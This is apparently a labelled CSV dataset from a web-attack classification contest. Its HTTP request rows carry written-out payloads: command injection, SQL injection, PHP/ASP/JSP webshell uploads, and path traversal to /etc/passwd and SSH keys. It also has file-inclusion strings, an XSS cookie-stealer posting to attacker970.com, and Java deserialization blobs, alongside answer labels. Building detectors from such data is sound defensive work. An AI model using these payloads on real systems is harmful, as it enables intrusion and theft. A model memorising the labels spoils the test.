row_id,timestamp,user_agent,method,src_ip,dst_ip,url_path,request_body,attack_type(结果列，需参赛选手判断输出),attack_type_pred
5612,2025-10-29 10:10:24,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.252.153.178,10.187.20.132,/ping,q=hello619|c'a't /etc/passwd,远程命令执行攻击,远程命令执行攻击
7144,2025-10-22 05:49:12,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.251.148.144,10.187.26.188,/APi/usErs,,正常访问,正常访问
10135,2025-10-30 14:55:51,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,PUT,10.251.216.206,10.210.184.39,/login/554,q=query6032&category=books,正常访问,正常访问
1500,2025-10-27 01:50:55,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.7.21,10.240.84.19,/api/data&test=298,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA%3D%3D831&timestamp=1763344098",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
1158,2025-11-04 12:42:33,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.7.21,10.240.84.20,/delete-account,redirect_url=http://malicious351.com&token=bypass,CSRF攻击,CSRF攻击
1670,2025-10-20 18:29:08,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.251.216.206,10.210.184.39,/transfer,action=delete&confirm=true,CSRF攻击,CSRF攻击
5554,2025-11-16 06:20:16,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.253.250.221,10.10.130.86,/api/page?include=php://filter/resource=/etc/passwd839,,文件包含攻击,文件包含攻击
6188,2025-11-06 16:57:08,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.7.189,10.251.99.247,/login,"username=admin263' UNION SELECT username,password FROM admin_users--&password=anything",SQL注入攻击,SQL注入攻击
1990,2025-10-22 04:39:10,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.7.103,10.240.99.224,/abouT,q=QuEr+y35&ca+tegoRY+=BoOks,正常访问,正常访问
4510,2025-10-30 00:34:49,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.187.74.230,10.252.158.86,/ADMIn/SETtings&timestamp=1763349583,SeTtiNg%3DDisable_seCuRity%+26vaLue%3dtruE&timestamp=17+63346670&random=4221&debug=+1,CSRF攻击,CSRF攻击
4534,2025-11-10 20:48:07,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.169,/api/orders,,正常访问,正常访问
62,2025-11-09 02:25:00,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.53.116.227,10.10.110.142,/delete-account,to=attacker&amount=1000,CSRF攻击,CSRF攻击
10181,2025-11-14 08:16:26,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,192.168.8.183,10.251.227.38,/home/88,product_id=546&quantity=7,正常访问,正常访问
3826,2025-10-27 17:14:42,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.187.19.206,10.253.177.28,/api/restore,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==876",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
10970,2025-10-28 07:43:18,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.244.15.48,10.252.133.241,/run,address=127.0.0.1249; ls -la,远程命令执行攻击,远程命令执行攻击
4504,2025-11-12 17:19:48,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.22.239,10.251.99.250,/view,path=../../../config/database364.yml,目录遍历攻击,目录遍历攻击
9023,2025-11-07 13:27:56,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.210.108.26,10.60.33.18,/blog,,正常访问,正常访问
1641,2025-11-05 00:19:13,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.251.128.175,10.244.155.144,/services,name=User4794&email=user7523@example.com&message=Hello,正常访问,正常访问
3575,2025-11-09 12:07:38,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.251.216.206,10.210.184.39,/upload,"------WebKitFormBoundary115180
Content-Disposition: form-data; name=""upload""; filename=""webshell399.asp""
Content-Type: application/octet-stream

<% eval request(""cmd"") %>
------WebKitFormBoundary796450--",文件上传攻击,文件上传攻击
5903,2025-10-22 22:37:53,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.6.36,10.240.181.222,/services,,正常访问,正常访问
10599,2025-11-04 02:20:31,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.5.85,10.2.66.33,/admin/settings,new_password=hacked149&confirm_password=hacked703,CSRF攻击,CSRF攻击
5899,2025-11-15 17:49:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.20.65,10.251.99.249,/api/upload,"------WebKitFormBoundary125409
Content-Dispositi+on: form-data; name=""file""; filename=""shell970.ph+p.jpg""
Content-Type: image/jpeg

<?php system(+$_GET['cmd']); ?>
------WebKitFormBoundary179630+--",文件上传攻击,文件上传攻击
485,2025-10-16 20:35:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.25.189.55,10.10.130.86,/paGe,LaNg%3DpH+p://input,文件包含攻击,文件包含攻击
800,2025-11-05 11:53:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.25.73.35,10.168.3.2,/home/123,username=admin&password=secret123,正常访问,正常访问
6409,2025-11-11 01:43:51,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.108.10.250,10.253.250.159,/api/change-password,new_password%3Dhac+ked130%26confirm_p+assword%3Dhacked67+8,CSRF攻击,CSRF攻击
4287,2025-11-09 13:28:47,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.92.7,10.10.228.197,/cOntAct&debug=1&random=7932&cache=true,useRnAmE=user7811&password=sECrEt8917&cache=false,正常访问,正常访问
9483,2025-10-25 05:15:28,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.251.51.95,10.10.110.133,/fiLE?CoNtent%3D../../../.git/cOnFIG703,,目录遍历攻击,目录遍历攻击
2701,2025-10-21 15:26:29,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.15.91,10.251.227.9,/upload,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==320",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
2660,2025-10-23 03:47:56,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.244.253.208,10.244.155.144,/api/orders,,正常访问,正常访问
1432,2025-11-03 22:33:32,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.187.74.27,10.252.158.86,/api/data&random=4036&timestamp=1763345679,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA%3D%3D709&debug=0",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
8784,2025-10-21 03:05:34,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.250.3.232,10.244.155.143,/proFile?Sort=nAMe,,正常访问,正常访问
4992,2025-10-30 20:13:22,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.16.70,10.251.227.109,/page?theme=file:///etc/passwd107,,文件包含攻击,文件包含攻击
7812,2025-11-16 14:07:32,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.250.222,10.10.130.86,/documents/upload,"------WebKitFormBoundary498478
Content-Disposition: form-data; name=""file""; filename=""shell175.php""
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary824581--",文件上传攻击,文件上传攻击
391,2025-10-30 11:26:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.53.116.227,10.10.110.143,/admIN/settiNgs,target_uSer%3DadmInistRAtoR%26pErMISsiOn%3DAdMin,CSRF攻击,CSRF攻击
10079,2025-11-06 21:59:21,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.252.157.36,10.251.110.250,/deserialize&test=738&debug=1,"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldJYGou83gM6gAgABRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAAHdAAKamF2YS51dGlsLnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5Db25zdGFudE1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHcIAAAAQAAAAAJzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABRqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==937&test=22&random=807&debug=0",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
6737,2025-11-14 22:45:53,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.253.92.7,10.10.228.198,/users?id=61 OR 1=1,,SQL注入攻击,SQL注入攻击
3309,2025-11-16 15:03:56,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.244.33.165,10.252.133.241,/profile/avatar,"------WebKitFormBoundary377846
Content-Disposition: form-data; name=""file""; filename=""shell205.php.jpg""
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary828012--",文件上传攻击,文件上传攻击
2119,2025-10-23 11:58:15,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.244.38.115,10.210.184.42,/profile,,正常访问,正常访问
5165,2025-10-29 02:04:46,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.252.168.242,10.16.210.9,/file?load%3D../../../WEB-INF/web.xml705,,目录遍历攻击,目录遍历攻击
1755,2025-10-23 04:40:03,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.244.8.66,10.244.155.144,/products,,正常访问,正常访问
919,2025-11-08 16:46:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.53.116.227,10.18.26.188,/transFEr,nEw_pasSword%3DHackEd123%26+coNfIrm_pAsSwoRD%3DhacKed12+3,CSRF攻击,CSRF攻击
2722,2025-10-24 20:55:53,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.245.76.184,10.252.133.241,/api/users,product_id=142&quantity=8,正常访问,正常访问
9378,2025-11-08 21:51:07,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.246.110.115,10.244.155.143,/transfer,email=attacker455@example.com&role=admin,CSRF攻击,CSRF攻击
6734,2025-11-02 11:12:56,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.14.237,10.240.99.224,/comment,content%3D%3Cscript%3Edocument.location%3D%27http://attacker970.com/steal.php?cookie%3D%27+document.cookie%3C/script%3E,XSS跨站脚本攻击,XSS跨站脚本攻击
9522,2025-10-27 18:41:35,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,PUT,10.108.208.231,10.253.176.212,/contact/631&debug=1&random=1208&test=449,name=User8424&email=user8547@example.com&message=Hello&timestamp=1763346687&debug=1&random=9311,正常访问,正常访问
9521,2025-11-08 07:22:30,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.187.19.232,10.253.177.27,/dashboard,"{""product_id"":201,""quantity"":5}",正常访问,正常访问
1674,2025-11-05 23:55:40,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.7.21,10.240.84.19,/search,"{""username"":""user2426"",""password"":""secret4051""}",正常访问,正常访问
9855,2025-10-29 04:22:28,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.25.189.55,10.153.250.159,/post?name=<svg/onload=alert(973)>,,XSS跨站脚本攻击,XSS跨站脚本攻击
6613,2025-11-14 15:58:16,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.108.208.231,10.253.251.75,/api/chANge-PaSSWORd,nEw_pASsWOrD=hackEd733&confIRM_PaSSwoRD=hACkEd510,CSRF攻击,CSRF攻击
3025,2025-10-20 12:21:39,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.13.88,10.251.10.50,/Transfer&test=754&debug=1&cache=false,NEw_PaSsword%3DhAckED700%26COnfirM_pAsSwOrd%3DhackED450&timestamp=1763344850&timestamp=1763344850,CSRF攻击,CSRF攻击
5915,2025-10-28 03:24:38,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,192.168.22.131,10.251.98.17,/upload&cache=true&debug=0&random=9109,"------WebKitFormBoundary598014
Content-Disposition:%20form-data;%20name%3D%22docum+ent%22;%20filename%3D%22malware185.exe%22
Content-Type:%20application/octet-stream+

MZ......................
------WebKitFormBoundary794985--&cache=false&test=180",文件上传攻击,文件上传攻击
4706,2025-10-22 05:06:52,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.253.83.6,10.253.68.169,/template,file=php://filter/read=convert.base64-encode/resource=config760.php,文件包含攻击,文件包含攻击
4500,2025-11-14 15:47:37,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.108.130.252,10.252.187.130,/search,name=<svg/onload=alert(87)>,XSS跨站脚本攻击,XSS跨站脚本攻击
1594,2025-10-21 14:16:55,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.253.68.105,10.10.110.133,/api/download,include=../../../../root/.ssh/id_rsa250,目录遍历攻击,目录遍历攻击
6601,2025-11-16 08:03:24,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.253.92.7,10.10.228.196,/search?content=<iframe src=javascript:alert(170)>,,XSS跨站脚本攻击,XSS跨站脚本攻击
9359,2025-10-27 04:32:27,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.246.110.115,10.244.155.143,/deserialize,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==126",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
9885,2025-10-20 18:46:19,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.25.73.34,10.168.3.2,/theme?lang=php://input,,文件包含攻击,文件包含攻击
484,2025-10-21 06:54:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.25.189.55,10.153.177.26,/search?q=search&timestamp=1762948282&cache=false&cache=false,,正常访问,正常访问
8216,2025-11-08 13:51:22,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.210.7.78,10.244.155.171,/services,,正常访问,正常访问
7692,2025-10-24 11:41:27,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,10.246.32.214,10.244.155.148,/ASsetS&random=8349&random=8349,File=../.+./../../E+tC/passwd+490&debug+=1,目录遍历攻击,目录遍历攻击
9391,2025-10-29 03:18:05,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,10.250.225.207,10.244.155.165,"/apI/PrOductS?prodUCT=961 AND EXTRactVALue(1, CoNCAT(0x7E,(SELeCT user()),0X7E))",,SQL注入攻击,SQL注入攻击
8067,2025-11-03 21:17:32,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.25.14.28,192.168.3.55,/include?theme=phar://malicious793.phar/shell.php,,文件包含攻击,文件包含攻击
2486,2025-10-28 22:27:59,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.83.6,10.253.68.169,/view,include=../../../../root/.ssh/id_rsa470,目录遍历攻击,目录遍历攻击
1485,2025-11-04 19:51:01,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,PUT,10.187.74.251,10.252.158.86,/profile/864,"{""product_id"":734,""quantity"":7}",正常访问,正常访问
5637,2025-11-16 14:00:35,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,POST,10.253.19.11,10.251.110.241,/seArch&random=2825,"{%22ProDuct_Id%22:791,%22quANtiTY%22:2}&timestamp=1763343449&debug=1&test=888",正常访问,正常访问
2238,2025-11-02 22:25:31,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,DELETE,10.244.252.80,10.210.184.42,/settings&timestamp=1763344048&random=4494&debug=0,,正常访问,正常访问
3081,2025-11-13 05:56:41,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.21.3,10.91.134.184,/api/execute?address=127.0.0.1288; net user,,远程命令执行攻击,远程命令执行攻击
5700,2025-11-16 20:27:48,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,GET,192.168.20.65,10.251.99.249,/view?filename=../../../../etc/hosts717,,目录遍历攻击,目录遍历攻击
4650,2025-11-10 06:26:20,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,10.208.116.216,10.208.54.1,/blog,page=35&limit=10&sort=name,正常访问,正常访问
338,2025-10-26 12:51:00,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,10.25.73.35,10.60.33.18,/seaRch?Message=<body onload=aLErT('xSS')>,,XSS跨站脚本攻击,XSS跨站脚本攻击
6892,2025-11-05 13:32:20,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,POST,192.168.21.21,10.162.55.195,/login,"username=admin554' UNION SELECT username,password FROM admin_users--&password=anything",SQL注入攻击,SQL注入攻击
6722,2025-10-18 17:51:44,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,GET,192.168.4.177,10.251.248.103,/about,,正常访问,正常访问
358,2025-10-30 10:44:00,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,DELETE,10.25.73.35,10.60.33.18,/cOntact/123,,正常访问,正常访问
5952,2025-11-03 02:43:01,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,192.168.10.158,10.251.99.250,/api/upload,"------WebKitFormBoundary163754
Content-Disposition: form-data; name=""avatar""; filename=""backdoor70.jsp""
Content-Type: application/octet-stream

<% Runtime.getRuntime().exec(request.getParameter(""cmd"")); %>
------WebKitFormBoundary306633--",文件上传攻击,文件上传攻击
8290,2025-10-26 09:11:44,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,POST,10.108.208.231,10.253.176.213,/api/restore,"rO0ABXNyADRteS5wYWNrYWdlLk15Q2xhc3MAAAAAAAAAAQwAAHhwdwEAHQACAAAAAnNyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAABXZyABBqYXZhLmxhbmcuU3lzdGVtAAAAAAAAAAAAAABJKWN1cnJlbnRUaW1lTWlsbGlzSmF2YQBAb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp
b25zMS5CYXNoZU1hcAAAAAAAAAABWACIAAVtYXB0AA9MamF2YS91dGlsL01hcDt4cHNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDPAwADSQAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAHdAAJbXlPYmplY3R0AAJbQnNyABdqYXZhLmxhbmcuU3RyaW5n063KKLjqYr4CAAFaAAV2YWx1ZXhyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHQABHRlc3R0AAR0cnVleA==844",Java反序列化漏洞利用攻击,Java反序列化漏洞利用攻击
7117,2025-11-14 04:05:36,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,GET,192.168.6.186,10.234.72.203,/file,resource=../../.env164,目录遍历攻击,目录遍历攻击
